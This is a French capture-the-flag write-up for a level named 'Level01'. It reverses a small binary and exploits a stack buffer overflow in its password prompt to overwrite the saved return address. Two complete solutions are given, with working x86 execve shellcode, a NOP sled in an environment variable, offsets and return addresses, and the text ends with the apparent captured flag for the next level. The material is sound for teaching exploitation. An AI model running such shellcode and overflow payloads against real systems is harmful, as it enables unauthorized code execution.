# Level01

## **Déroulement du programme :**

- une variable globale est déclarée (disons `g_user_name`)

#### verify_user_name()
- `return` d'un `strncmp` de 7 entre `g_user_name` et **"dat_wil"**

#### verify_user_pass(buffer)
- `return` d'un `strncmp` de 5 entre `buffer` et **"admin"**

#### main()
- un buffer de 16 octets est déclaré (disons `buffer`)
- un **integer** est déclaré (disons `ret`)
- `fgets` de 256 dans `g_user_name`
- `ret` prend la valeur de retour de `verify_user_name`
- si `ret` vaut 0
    - `fgets` de 100 dans `buffer`
    - `ret` prend la valeur du retour de `verify_user_pass`
- 1 est renvoyé dans tous les cas

___
## **Réflexion :**

On va chercher à surcharger la sauvegarde de l'**EIP** présente dans la **stack frame** du `main` en faisant un **buffer overflow** depuis `buffer`.

Pour ce faire, il faudra rentrer dans la condition où il est vérifié que `ret` vaut 0, notre premier argument sera donc **"dat_wil"**.

Pour le second argument, on trouve un offset de 80 à l'aide de [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?).

___
## **Solution :**

On crée une **variable d'environnement** :

```bash
export SHELL_CODE=$(python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

Dans **gdb**, on trouve son adresse à l'aide de :

```
x/20s *((char **) environ)
```

Et enfin :

```bash
cat <(python -c 'print("dat_wil")' ; python -c 'print("A"*80 + "\x04\xdf\xff\xff")') - | ./level01
```
___
## Variante :

On écrit un **shell code** à la suite de **"dat_wil"** (le premier `fgets` étant de 256 on a largement la place de l'y mettre) :

```python
python -c 'print("dat_wil" +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'
```

Dans le deuxième argument, on met à la suite de l'offset l'adresse de `g_user_name` + la taille de **"dat_wil"** pour tomber directement sur le **shell code** :

```python
python -c 'print("A"*80 + "\x47\xa0\x04\x08")'
```

On obtient au final :

```bash
$> cat <(python -c 'print("dat_wil" +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")' ; python -c 'print("A"*80 + "\x47\xa0\x04\x08")') - | ./level01
```

>> PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv